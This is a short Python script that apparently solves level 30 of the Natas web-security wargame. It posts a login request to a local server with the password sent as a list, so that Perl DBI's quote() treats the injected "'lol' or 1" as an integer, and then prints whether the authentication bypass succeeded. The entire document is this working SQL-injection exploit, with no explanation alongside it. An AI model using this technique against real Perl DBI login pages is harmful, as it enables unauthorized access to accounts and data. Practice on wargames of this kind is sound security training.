import requests
from urllib.parse import quote, unquote

session = requests.Session()

def natas30(url):
    # DBI::SQL_INTEGER = 4    
    params={"username": "natas31", "password": ["'lol' or 1",4]}
    response = session.post(url, data=params)
    print(response.text)
    if 'FAIL' in response.text:
        print("FAILED")
    else:
        print("SUCCES")

if __name__ == '__main__':
    url = 'http://localhost:8080/index.pl'
    natas30(url)
